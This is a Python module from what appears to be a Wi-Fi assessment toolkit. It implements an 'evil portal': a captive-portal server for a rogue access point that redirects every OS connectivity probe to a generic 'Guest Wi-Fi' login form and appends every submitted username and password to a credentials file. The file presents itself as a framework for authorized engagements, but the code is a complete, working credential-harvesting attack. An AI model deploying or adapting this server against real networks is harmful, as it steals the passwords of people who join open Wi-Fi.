"""Evil-portal: a generic captive-portal HTTP server for authorized Wi-Fi
assessments.

This is a *framework*, not an impersonation kit. It stands up a rogue AP (that
plumbing lives in the ``evil-portal-launch`` script and the ``kestrel
evil-portal`` CLI) and serves a **portal page the operator supplies**, logging
whatever a client submits so an engagement can demonstrate that users will hand
credentials to an open network. It ships **neutral, clearly-generic** templates
("Guest Wi-Fi", a plain network login); it must never be pointed at a page that
imitates a real company or its login — build only pages that are honestly your
own. Lab / authorized use only, gated by the authorized-use acknowledgment.

This module is the pure, testable part: request routing, the probe-URL table,
template loading (with a built-in neutral fallback), and the captured-submission
store. The actual socket serving is a thin stdlib adapter at the bottom.
Stdlib only.
"""
from __future__ import annotations

import json
import os
import time
from collections import namedtuple

# A routed response: what the server should send back, plus the fields to record
# (a dict when this request submitted credentials, else None).
Response = namedtuple("Response", "status content_type body location recorded")

# OS captive-portal *probe* URLs. Hitting one and getting a normal page (not the
# expected 204/"Success") is what makes a phone/laptop pop its "Sign in to Wi-Fi"
# sheet. We serve the portal for every GET regardless; this table is for the
# status readout and so a probe is logged as such, not mistaken for a visit.
_PROBE_HOSTS = (
    "connectivitycheck.gstatic.com", "connectivitycheck.android.com",
    "clients3.google.com", "www.google.com",          # generate_204
    "captive.apple.com",                               # hotspot-detect
    "www.msftconnecttest.com", "www.msftncsi.com", "dns.msftncsi.com",  # ncsi
    "detectportal.firefox.com",                        # success.txt
    "network-test.debian.org", "nmcheck.gnome.org",
)
_PROBE_PATHS = (
    "/generate_204", "/gen_204", "/hotspot-detect.html", "/library/test/success.html",
    "/ncsi.txt", "/connecttest.txt", "/redirect", "/success.txt", "/canonical.html",
)


def is_probe_path(path, host=""):
    """True when (path, host) looks like an OS connectivity/captive-portal probe."""
    p = (path or "").split("?", 1)[0].rstrip("/") or "/"
    if p != "/" and p in (x.rstrip("/") for x in _PROBE_PATHS):
        return True
    return (host or "").split(":", 1)[0].lower() in _PROBE_HOSTS


# A neutral built-in portal used when the operator ships no template. It is
# deliberately generic -- no real brand, no logo -- and says what it is.
DEFAULT_PORTAL = """<!doctype html>
<meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Guest Wi-Fi</title>
<style>body{font-family:system-ui,sans-serif;max-width:22rem;margin:3rem auto;padding:0 1rem}
input,button{font-size:1rem;padding:.6rem;width:100%;box-sizing:border-box;margin:.3rem 0}
button{background:#1565c0;color:#fff;border:0;border-radius:.3rem}</style>
<h2>Guest Wi-Fi</h2>
<p>Sign in to use this network.</p>
<form method="post" action="/login">
<input name="username" placeholder="Username or email" autocomplete="username">
<input name="password" type="password" placeholder="Password" autocomplete="current-password">
<button type="submit">Connect</button>
</form>
"""

DEFAULT_DONE = """<!doctype html>
<meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Connected</title>
<body style="font-family:system-ui,sans-serif;max-width:22rem;margin:3rem auto;padding:0 1rem">
<h2>You're connected</h2><p>Thanks. You can close this page.</p>
"""


def _read_template(template_dir, name, fallback):
    if template_dir:
        path = os.path.join(template_dir, name)
        try:
            with open(path, "r", encoding="utf-8") as fh:
                return fh.read()
        except OSError:
            pass
    return fallback


def render_portal(template_dir):
    """The portal page: ``index.html`` from the operator's template dir, or the
    neutral built-in when none is present."""
    return _read_template(template_dir, "index.html", DEFAULT_PORTAL)


def render_done(template_dir):
    """The post-submit page: ``done.html`` from the template dir, or built-in."""
    return _read_template(template_dir, "done.html", DEFAULT_DONE)


# The paths that serve the portal page itself. Every *other* GET (an OS captive
# probe, a favicon, whatever URL the client first tried) is 302-redirected here,
# which is what makes a phone/laptop open its "Sign in to Wi-Fi" window -- a bare
# 200 to the probe is unreliable on modern Android/Samsung.
_PORTAL_PATHS = frozenset(("/", "/portal", "/index.html", "/login"))


def _norm_path(path):
    return ((path or "/").split("?", 1)[0].rstrip("/") or "/")


def redirect_body(location):
    """A tiny HTML body for a 302, with a meta-refresh + link as a fallback for
    clients that don't auto-follow the redirect (some Samsung builds)."""
    return ('<!doctype html><meta charset="utf-8"><title>Sign in</title>'
            '<meta http-equiv="refresh" content="0; url=%s">'
            '<body>Redirecting to <a href="%s">sign in</a>.</body>'
            % (location, location))


def route(method, path, fields, template_dir=None, host="", portal_ip=""):
    """Decide the response for one request. Pure: no I/O, no recording.

    - ``POST`` with any form fields -> record them, serve the "connected" page.
    - ``GET`` of a portal path (``/`` etc.) -> serve the portal page (200).
    - any other ``GET`` (an OS captive probe, favicon, a random URL) -> a 302
      **redirect** to the portal, which is what reliably pops the sign-in window.
    """
    if (method or "GET").upper() == "POST" and fields:
        return Response(200, "text/html; charset=utf-8",
                        render_done(template_dir), None, dict(fields))
    if _norm_path(path) in _PORTAL_PATHS:
        return Response(200, "text/html; charset=utf-8",
                        render_portal(template_dir), None, None)
    location = ("http://%s/" % portal_ip) if portal_ip else "/"
    return Response(302, "text/html; charset=utf-8",
                    redirect_body(location), location, None)


def record_cred(creds_path, fields, client="", now=None):
    """Append one captured submission as a JSON line. Returns the record."""
    now = time.time() if now is None else now
    rec = {"ts": now, "client": client or "", "fields": dict(fields or {})}
    os.makedirs(os.path.dirname(creds_path), exist_ok=True)
    with open(creds_path, "a", encoding="utf-8") as fh:
        fh.write(json.dumps(rec, sort_keys=True) + "\n")
    return rec


def load_creds(creds_path):
    """Read the captured submissions (JSON lines); [] when none/absent."""
    out = []
    try:
        with open(creds_path, "r", encoding="utf-8") as fh:
            for line in fh:
                line = line.strip()
                if line:
                    try:
                        out.append(json.loads(line))
                    except ValueError:
                        continue
    except OSError:
        return []
    return out


def format_creds(creds):
    """A plain-text table of captured submissions for the CLI."""
    if not creds:
        return "no submissions captured yet"
    lines = []
    for r in creds:
        ts = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime(r.get("ts", 0)))
        kv = " ".join("%s=%s" % (k, v) for k, v in sorted(r.get("fields", {}).items()))
        lines.append("%s  %-15s  %s" % (ts, r.get("client", ""), kv))
    return "\n".join(lines)


# --- stdlib serving adapter (not unit-tested; the logic above is) -----------

def _elog(msg):  # pragma: no cover - stderr goes to the unit's journal
    """Log a portal line to stderr so ``journalctl -u kestrel-evil-portal`` shows
    what each client did -- which request reached the portal, and whether a
    submission was captured. Without this the portal was a black box when a
    client's captive sheet failed to appear."""
    import sys
    sys.stderr.write("evil-portal[http]: " + msg + "\n")
    sys.stderr.flush()


def serve(template_dir, creds_path, host="0.0.0.0", port=80, portal_ip=""):  # pragma: no cover
    """Run the portal until interrupted. All request logic goes through
    :func:`route`; this only adapts http.server to it and records creds."""
    from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
    from urllib.parse import parse_qs

    def _respond(h, resp):
        body = resp.body.encode("utf-8")
        h.send_response(resp.status)
        if resp.location:
            h.send_header("Location", resp.location)
        h.send_header("Content-Type", resp.content_type)
        h.send_header("Content-Length", str(len(body)))
        h.send_header("Cache-Control", "no-store")
        # Close every connection: captive clients fire probes in bursts and
        # reuse keep-alive sockets, which desyncs and makes Chrome retry until
        # it gives up with ERR_TOO_MANY_RETRIES. One request per connection.
        h.send_header("Connection", "close")
        h.end_headers()
        h.wfile.write(body)

    class Handler(BaseHTTPRequestHandler):
        # HTTP/1.0 => no keep-alive; each request is its own connection.
        protocol_version = "HTTP/1.0"

        def log_message(self, *a):  # quiet; we log our own structured lines
            pass

        def _client(self):
            return self.client_address[0] if self.client_address else ""

        def do_GET(self):
            hosth = self.headers.get("Host", "")
            resp = route("GET", self.path, {}, template_dir, hosth, portal_ip)
            _elog("GET %s host=%s from=%s -> %d%s" % (
                self.path, hosth, self._client(), resp.status,
                " (captive probe)" if is_probe_path(self.path, hosth) else ""))
            _respond(self, resp)

        def do_POST(self):
            hosth = self.headers.get("Host", "")
            length = int(self.headers.get("Content-Length") or 0)
            raw = self.rfile.read(length).decode("utf-8", "replace") if length else ""
            fields = {k: v[0] for k, v in parse_qs(raw).items()}
            resp = route("POST", self.path, fields, template_dir, hosth, portal_ip)
            if resp.recorded:
                try:
                    record_cred(creds_path, resp.recorded, self._client())
                    _elog("POST %s from=%s CAPTURED %d field(s): %s" % (
                        self.path, self._client(), len(resp.recorded),
                        ",".join(sorted(resp.recorded))))
                except OSError as exc:
                    _elog("POST %s from=%s could not record: %s"
                          % (self.path, self._client(), exc))
            else:
                _elog("POST %s host=%s from=%s (no fields)"
                      % (self.path, hosth, self._client()))
            _respond(self, resp)

    try:
        httpd = ThreadingHTTPServer((host, port), Handler)
    except OSError as exc:
        _elog("FAILED to bind %s:%s -- %s" % (host, port, exc))
        raise
    _elog("listening on %s:%s portal_ip=%s (templates: %s)"
          % (host, port, portal_ip or "?", template_dir or "built-in"))
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        pass
    finally:
        httpd.server_close()


def main(argv=None):  # pragma: no cover
    """Entry point for the launcher: ``evilportal <template_dir> <creds_path>
    [host] [port] [portal_ip]``."""
    import sys
    argv = list(sys.argv[1:] if argv is None else argv)
    if len(argv) < 2:
        sys.stderr.write("usage: evilportal <template_dir> <creds_path> "
                         "[host] [port] [portal_ip]\n")
        return 2
    template_dir, creds_path = argv[0], argv[1]
    host = argv[2] if len(argv) > 2 else "0.0.0.0"
    port = int(argv[3]) if len(argv) > 3 else 80
    portal_ip = argv[4] if len(argv) > 4 else ""
    serve(template_dir or None, creds_path, host, port, portal_ip)
    return 0


if __name__ == "__main__":  # pragma: no cover
    raise SystemExit(main())
